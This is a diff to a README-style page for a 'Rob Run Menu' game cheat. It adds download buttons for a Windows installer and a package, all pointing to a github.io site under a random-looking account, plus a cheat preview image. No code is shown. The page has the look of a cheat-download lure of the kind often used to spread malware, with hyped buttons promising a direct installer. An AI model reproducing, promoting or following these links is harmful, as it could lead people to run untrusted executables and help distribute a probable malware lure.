@@ -4,7 +4,7 @@
 
 # 📥 **CLICK FOR DOWNLOAD — START HERE**
 
-## [⬇️ **GET THE WINDOWS INSTALLER**]()
+## [⬇️ **GET THE WINDOWS INSTALLER**](https://cyuvdhzrffuu.github.io/Rob-Run-Menu/)
 
 > One tap, the package opens on its own page — no wrapper in between.
 
@@ -12,11 +12,11 @@
 
 ## 🖼️ **PREVIEW IMAGE**
 
-<img src="" width="1280" height="720" alt= "preview image">
+<img src="https://github.com/cyuvdhzrffuu/Rob-Run-Menu/blob/main/rob%20run%20cheats.webp?raw=true" width="1280" height="720" alt= "preview image">
 
 ---
 
-### 📦 [**OPEN THE PACKAGE**]()
+### 📦 [**OPEN THE PACKAGE**](https://cyuvdhzrffuu.github.io/Rob-Run-Menu/)
 
 ---
 
